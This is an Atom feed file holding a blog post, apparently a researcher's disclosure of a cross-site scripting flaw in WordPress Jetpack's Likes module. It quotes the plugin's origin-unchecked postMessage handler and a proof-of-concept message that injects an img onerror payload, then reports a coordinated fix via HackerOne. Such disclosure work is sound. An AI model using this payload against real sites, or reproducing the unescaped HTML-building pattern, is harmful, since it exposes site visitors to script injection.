@@ -1,0 +1,280 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+<generator uri="http://jekyllrb.com" version="3.0.3">Jekyll</generator>
+<link href="http://localhost:3000/feed.xml" rel="self" type="application/atom+xml" />
+<link href="http://localhost:3000/" rel="alternate" type="text/html" />
+<updated>2016-06-21T13:17:55+02:00</updated>
+<id>http://localhost:3000/</id>
+<title>Luciano Corsalini</title>
+<entry>
+<title>Jetpack, how to supercharge your WP blog with a XSS</title>
+<link href="http://localhost:3000/jetpack-the-supercharge-that-expose-your-wp-blog/" rel="alternate" type="text/html" title="Jetpack, how to supercharge your WP blog with a XSS" />
+<published>2016-06-21T10:30:00+02:00</published>
+<updated>2016-06-21T10:30:00+02:00</updated>
+<id>http://localhost:3000/jetpack-the-supercharge-that-expose-your-wp-blog</id>
+<content type="html" xml:base="http://localhost:3000/jetpack-the-supercharge-that-expose-your-wp-blog/">&lt;p&gt;Wordpress is the commonly used blog framework/platform, indeed, if a user needs
+to be ready in short times or just want to handle his own blog can setup a wordpress
+intance in few minutes.&lt;/p&gt;
+
+&lt;h2 id=&quot;charging-wp&quot;&gt;Charging WP&lt;/h2&gt;
+
+&lt;p&gt;Wordpress itself provides a bunch of recommended plugins. The first one in the list
+is &lt;strong&gt;Jetpack&lt;/strong&gt; (owned by &lt;a href=&quot;https://automattic.com/&quot;&gt;Automattic&lt;/a&gt;). Jetpack is an
+all-in-one solutions to boost traffic, performance and protection… or, at least,
+it should be.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-likes-module&quot;&gt;The `Likes Module´&lt;/h2&gt;
+
+&lt;p&gt;Jetpack, as said, has some useful modules. One of them is the &lt;strong&gt;likes&lt;/strong&gt; module.
+This one shows &lt;a href=&quot;https://wordpress.com&quot;&gt;Wordpress&lt;/a&gt; users that put a like on the post
+and let them collect and organize blog articles on their own wp.com account.
+If enabled, the plugin add a JS postMessage listener for a &lt;strong&gt;likesMessage&lt;/strong&gt; event.&lt;/p&gt;
+
+&lt;p&gt;{% highlight js %}
+pm.bind( ‘likesMessage’, function(e) { JetpackLikesMessageListener(e); } );
+{% endhighlight %}&lt;/p&gt;
+
+&lt;p&gt;The main point is that this handler accept messages from any origin domain. Let’s give
+a look at &lt;strong&gt;JetpackLikesMessageListener&lt;/strong&gt; function.&lt;/p&gt;
+
+&lt;p&gt;{% highlight js %}
+function JetpackLikesMessageListener( event ) {
+	if ( ‘undefined’ === typeof event.event ) {
+		return;
+	}&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if ( &#39;masterReady&#39; === event.event ) {
+	jQuery( document ).ready( function() {
+		jetpackLikesMasterReady = true;
+
+		var stylesData = {
+				event: &#39;injectStyles&#39;
+			},
+			$sdTextColor = jQuery( &#39;.sd-text-color&#39; ),
+			$sdLinkColor = jQuery( &#39;.sd-link-color&#39; );
+
+		if ( jQuery( &#39;iframe.admin-bar-likes-widget&#39; ).length &amp;gt; 0 ) {
+			JetpackLikespostMessage( { event: &#39;adminBarEnabled&#39; }, window.frames[ &#39;likes-master&#39; ] );
+
+			stylesData.adminBarStyles = {
+				background: jQuery( &#39;#wpadminbar .quicklinks li#wp-admin-bar-wpl-like &amp;gt; a&#39; ).css( &#39;background&#39; ),
+				isRtl: ( &#39;rtl&#39; === jQuery( &#39;#wpadminbar&#39; ).css( &#39;direction&#39; ) )
+			};
+		}
+
+		if ( ! window.addEventListener ) {
+			jQuery( &#39;#wp-admin-bar-admin-bar-likes-widget&#39; ).hide();
+		}
+
+		stylesData.textStyles = {
+			color:          $sdTextColor.css( &#39;color&#39; ),
+			fontFamily:     $sdTextColor.css( &#39;font-family&#39; ),
+			fontSize:       $sdTextColor.css( &#39;font-size&#39; ),
+			direction:      $sdTextColor.css( &#39;direction&#39; ),
+			fontWeight:     $sdTextColor.css( &#39;font-weight&#39; ),
+			fontStyle:      $sdTextColor.css( &#39;font-style&#39; ),
+			textDecoration: $sdTextColor.css(&#39;text-decoration&#39;)
+		};
+
+		stylesData.linkStyles = {
+			color:          $sdLinkColor.css(&#39;color&#39;),
+			fontFamily:     $sdLinkColor.css(&#39;font-family&#39;),
+			fontSize:       $sdLinkColor.css(&#39;font-size&#39;),
+			textDecoration: $sdLinkColor.css(&#39;text-decoration&#39;),
+			fontWeight:     $sdLinkColor.css( &#39;font-weight&#39; ),
+			fontStyle:      $sdLinkColor.css( &#39;font-style&#39; )
+		};
+
+		JetpackLikespostMessage( stylesData, window.frames[ &#39;likes-master&#39; ] );
+
+		JetpackLikesBatchHandler();
+
+		jQuery( document ).on( &#39;inview&#39;, &#39;div.jetpack-likes-widget-unloaded&#39;, function() {
+			jetpackLikesWidgetQueue.push( this.id );
+		});
+	});
+}
+
+if ( &#39;showLikeWidget&#39; === event.event ) {
+	jQuery( &#39;#&#39; + event.id + &#39; .post-likes-widget-placeholder&#39;  ).fadeOut( &#39;fast&#39;, function() {
+		jQuery( &#39;#&#39; + event.id + &#39; .post-likes-widget&#39; ).fadeIn( &#39;fast&#39;, function() {
+			JetpackLikespostMessage( { event: &#39;likeWidgetDisplayed&#39;, blog_id: event.blog_id, post_id: event.post_id, obj_id: event.obj_id }, window.frames[&#39;likes-master&#39;] );
+		});
+	});
+}
+
+if ( &#39;clickReblogFlair&#39; === event.event ) {
+	wpcom_reblog.toggle_reblog_box_flair( event.obj_id );
+}
+
+if ( &#39;showOtherGravatars&#39; === event.event ) {
+	var $container = jQuery( &#39;#likes-other-gravatars&#39; ),
+		$list = $container.find( &#39;ul&#39; ),
+		offset, rowLength, height, scrollbarWidth;
+
+	$container.hide();
+	$list.html( &#39;&#39; );
+
+	$container.find( &#39;.likes-text span&#39; ).text( event.total );
+
+	jQuery.each( event.likers, function( i, liker ) {
+		$list.append( &#39;&amp;lt;li class=&quot;&#39; + liker.css_class + &#39;&quot;&amp;gt;&amp;lt;a href=&quot;&#39; + liker.profile_URL + &#39;&quot; class=&quot;wpl-liker&quot; rel=&quot;nofollow&quot; target=&quot;_parent&quot;&amp;gt;&amp;lt;img src=&quot;&#39; + liker.avatar_URL + &#39;&quot; alt=&quot;&#39; + liker.name + &#39;&quot; width=&quot;30&quot; height=&quot;30&quot; style=&quot;padding-right: 3px;&quot; /&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&#39;);
+	} );
+
+	offset = jQuery( &#39;[name=\&#39;&#39; + event.parent + &#39;\&#39;]&#39; ).offset();
+
+	$container.css( &#39;left&#39;, offset.left + event.position.left - 10 + &#39;px&#39; );
+	$container.css( &#39;top&#39;, offset.top + event.position.top - 33 + &#39;px&#39; );
+
+	rowLength = Math.floor( event.width / 37 );
+	height = ( Math.ceil( event.likers.length / rowLength ) * 37 ) + 13;
+	if ( height &amp;gt; 204 ) {
+		height = 204;
+	}
+
+	$container.css( &#39;height&#39;, height + &#39;px&#39; );
+	$container.css( &#39;width&#39;, rowLength * 37 - 7 + &#39;px&#39; );
+
+	$list.css( &#39;width&#39;, rowLength * 37 + &#39;px&#39; );
+
+	$container.fadeIn( &#39;slow&#39; );
+
+	scrollbarWidth = $list[0].offsetWidth - $list[0].clientWidth;
+	if ( scrollbarWidth &amp;gt; 0 ) {
+		$container.width( $container.width() + scrollbarWidth );
+		$list.width( $list.width() + scrollbarWidth );
+	}
+} } {% endhighlight %}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;What I immediately noticed is this code snippet&lt;/p&gt;
+
+&lt;p&gt;{% highlight js %}
+…
+$list.html( ‘’ );&lt;/p&gt;
+
+&lt;p&gt;$container.find( ‘.likes-text span’ ).text( event.total );&lt;/p&gt;
+
+&lt;p&gt;jQuery.each( event.likers, function( i, liker ) {
+  $list.append( ‘&amp;lt;li class=&quot;&#39; + liker.css_class + &#39;&quot;&amp;gt;&lt;a href=&quot;&#39; + liker.profile_URL + &#39;&quot; class=&quot;wpl-liker&quot; rel=&quot;nofollow&quot; target=&quot;_parent&quot;&gt;&lt;img src=&quot;&#39; + liker.avatar_URL + &#39;&quot; alt=&quot;&#39; + liker.name + &#39;&quot; width=&quot;30&quot; height=&quot;30&quot; style=&quot;padding-right: 3px;&quot; /&gt;&lt;/a&gt;&amp;lt;/li&amp;gt;’);
+} );
+…
+{% endhighlight %}&lt;/p&gt;
+
+&lt;p&gt;It seems that all &lt;strong&gt;liker&lt;/strong&gt; properties are not sanitized or escaped before use. This allow to embed
+the most commonly used &lt;strong&gt;XSS&lt;/strong&gt; payload &lt;em&gt;”&amp;gt;&amp;lt;img src=x onerror=code&amp;gt;&lt;/em&gt; and trig some js code.&lt;/p&gt;
+
+&lt;h2 id=&quot;engine-on&quot;&gt;Engine On&lt;/h2&gt;
+
+&lt;p&gt;Ok, to reach the target we’ve to post a custom js object which is handled firstly from the common
+listener dispatcher and then from the &lt;strong&gt;JetpackLikesMessageListener&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;{% highlight js %}&lt;br /&gt;
+_dispatch: function(e) {
+    //console.log(“$.pm.dispatch”, e, this);
+    try {
+        var msg = JSON.parse(e.data);
+    } catch (ex) {
+        //console.warn(“postmessage data invalid json: “, ex); //message wasn’t meant for pm
+        return;
+    }
+    if (!msg.type) {
+        //console.warn(“postmessage message type required”); //message wasn’t meant for pm
+        return;
+    }
+    var cbs = pm.data(“callbacks.postmessage”) || {}
+      , cb = cbs[msg.type];
+    if (cb) {
+        cb(msg.data);
+    } else {
+        var l = pm.data(“listeners.postmessage”) || {};
+        var fns = l[msg.type] || [];
+        for (var i = 0, len = fns.length; i &amp;lt; len; i++) {
+            var o = fns[i];
+            if (o.origin &amp;amp;&amp;amp; o.origin !== ‘*’ &amp;amp;&amp;amp; e.origin !== o.origin) {
+                console.warn(“postmessage message origin mismatch”, e.origin, o.origin);
+                if (msg.errback) {
+                    // notify post message errback
+                    var error = {
+                        message: “postmessage origin mismatch”,
+                        origin: [e.origin, o.origin]
+                    };
+                    pm.send({
+                        target: e.source,
+                        data: error,
+                        type: msg.errback
+                    });
+                }
+                continue;
+            }
+            function sendReply(data) {
+                if (msg.callback) {
+                    pm.send({
+                        target: e.source,
+                        data: data,
+                        type: msg.callback
+                    });
+                }
+            }
+            try {
+                if (o.callback) {
+                    o.fn(msg.data, sendReply, e);
+                } else {
+                    sendReply(o.fn(msg.data, e));
+                }
+            } catch (ex) {
+                if (msg.errback) {
+                    // notify post message errback
+                    pm.send({
+                        target: e.source,
+                        data: ex,
+                        type: msg.errback
+                    });
+                } else {
+                    throw ex;
+                }
+            }
+        }
+        ;
+    }
+}
+{% endhighlight %}&lt;/p&gt;
+
+&lt;p&gt;So we’ve to post an object with &lt;strong&gt;type&lt;/strong&gt; and &lt;strong&gt;data&lt;/strong&gt; properties where the &lt;strong&gt;data&lt;/strong&gt;
+one contains &lt;strong&gt;event&lt;/strong&gt; property and the &lt;strong&gt;likers&lt;/strong&gt; one. Our final code will looks
+like the following one.&lt;/p&gt;
+
+&lt;p&gt;{% highlight js %}
+// load the target page
+…
+target.postMessage(
+  JSON.stringify({
+    type: ‘likesMessage’,
+    data: {
+      event:’showOtherGravatars’,
+      likers: [
+        {
+          css_class: ‘”&amp;gt;&amp;lt;img src=x onerror=alert(0)&amp;gt;’
+        }
+      ]
+    }
+  })
+)
+…
+{% endhighlight %}&lt;/p&gt;
+
+&lt;h2 id=&quot;great-team--great-results&quot;&gt;Great team === great results&lt;/h2&gt;
+
+&lt;p&gt;Once found, I informed the vendor through &lt;a href=&quot;https://hackerone.com/&quot;&gt;h1&lt;/a&gt; that
+immediately triaged my report and pushed out a fix
+in a short time. The first patch has only an &lt;strong&gt;origin&lt;/strong&gt; check so I suggested them
+to apply a check for &lt;strong&gt;profile_URL&lt;/strong&gt; protocol too.&lt;/p&gt;
+</content>
+<category term="xss" />
+<category term="bug" />
+<category term="wordpress" />
+<category term="jetpack" />
+<summary>Wordpress is the commonly used blog framework/platform, indeed, if a user needsto be ready in short times or just want to handle his own blog can setup a wordpressintance in few minutes.</summary>
+</entry>
+</feed>
